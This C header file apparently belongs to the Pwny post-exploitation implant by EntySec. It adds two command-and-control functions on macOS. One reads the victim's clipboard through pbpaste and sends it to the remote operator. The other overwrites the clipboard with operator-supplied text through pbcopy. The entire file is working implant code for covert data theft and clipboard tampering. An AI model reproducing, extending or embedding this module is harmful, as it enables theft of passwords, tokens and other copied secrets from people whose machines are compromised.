/*
 * MIT License
 *
 * Copyright (c) 2020-2026 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#ifndef _CLIPBOARD_H_
#define _CLIPBOARD_H_

#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#include <pwny/tlv.h>
#include <pwny/api.h>
#include <pwny/c2.h>
#include <pwny/tlv_types.h>
#include <pwny/log.h>

#define CLIPBOARD_BASE 16

#define CLIPBOARD_GET \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       CLIPBOARD_BASE, \
                       API_CALL)
#define CLIPBOARD_SET \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       CLIPBOARD_BASE, \
                       API_CALL + 1)

#define TLV_TYPE_CLIP_DATA TLV_TYPE_CUSTOM(TLV_TYPE_STRING, CLIPBOARD_BASE, API_TYPE)

static tlv_pkt_t *clipboard_get(c2_t *c2)
{
    tlv_pkt_t *result;
    FILE *fp;
    char buffer[65536];
    size_t total;

    fp = popen("pbpaste 2>/dev/null", "r");
    if (fp == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    total = 0;
    memset(buffer, 0, sizeof(buffer));

    while (total < sizeof(buffer) - 1)
    {
        size_t n = fread(buffer + total, 1, sizeof(buffer) - 1 - total, fp);
        if (n == 0)
        {
            break;
        }
        total += n;
    }

    pclose(fp);

    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
    tlv_pkt_add_string(result, TLV_TYPE_CLIP_DATA, buffer);

    return result;
}

static tlv_pkt_t *clipboard_set(c2_t *c2)
{
    char data[65536];
    FILE *fp;

    if (tlv_pkt_get_string(c2->request, TLV_TYPE_CLIP_DATA, data) <= 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    fp = popen("pbcopy 2>/dev/null", "w");
    if (fp == NULL)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    fwrite(data, 1, strlen(data), fp);
    pclose(fp);

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

void register_clipboard_api_calls(api_calls_t **api_calls)
{
    api_call_register(api_calls, CLIPBOARD_GET, clipboard_get);
    api_call_register(api_calls, CLIPBOARD_SET, clipboard_set);
}

#endif
